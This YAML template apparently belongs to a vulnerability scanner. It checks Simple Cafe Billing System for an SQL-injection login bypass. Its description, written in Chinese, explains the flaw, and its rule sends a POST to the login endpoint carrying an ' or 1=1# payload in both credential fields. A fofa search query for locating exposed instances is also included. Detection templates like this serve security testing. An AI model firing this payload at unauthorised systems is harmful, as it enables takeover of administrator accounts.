id: CVE-nu11-01-SQL-baypass-Login-RCE-injection

info:
  name: Simple Cafe Billing System SQL注入baypass登录RCE漏洞
  author: daffainfo
  severity: critical
  description: Simple Cafe Billing System版本号的应用程序在/cafe_billing/admin_class.php来自remote SQL-Injection-Bypass-Authentication. 登录表单中的参数（用户名）没有得到正确保护，没有安全性，也无法逃避恶意负载。当用户向 MySQL 服务器发送恶意查询或恶意负载时，他可以绕过登录凭据并控制管理员帐户。
  reference:
    - https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/CVE-nu11-01
  metadata:
    fofa-query: "Simple Cafe Billing System"

rules:
  r0:
    request:
      method: POST
      path: /ajax.php?action=login
      body: |
        username=nu11secur1ty'+or+1%3D1%23&password=nu11secur1ty'+or+1%3D1%23
    expression: response.status == 200 && response.body.bcontains(b'1') && response.headers["content-type"].contains("text/html")
expression: r0()